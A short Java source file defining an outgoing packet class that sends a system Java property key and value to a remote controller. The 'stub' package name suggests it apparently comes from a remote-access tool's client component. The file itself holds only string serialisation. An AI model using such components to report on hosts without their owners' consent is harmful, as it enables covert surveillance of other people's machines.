package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet44SystemJavaProperty extends AbstractOutgoingPacket {
	
	private String key;
	private String value;
	
	public Packet44SystemJavaProperty(String key, String value) {
		this.key = key;
		this.value = value;
	}
	
	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(key);
		sw.writeLine(value);
	}

	@Override
	public byte getPacketId() {
		return 44;
	}

}
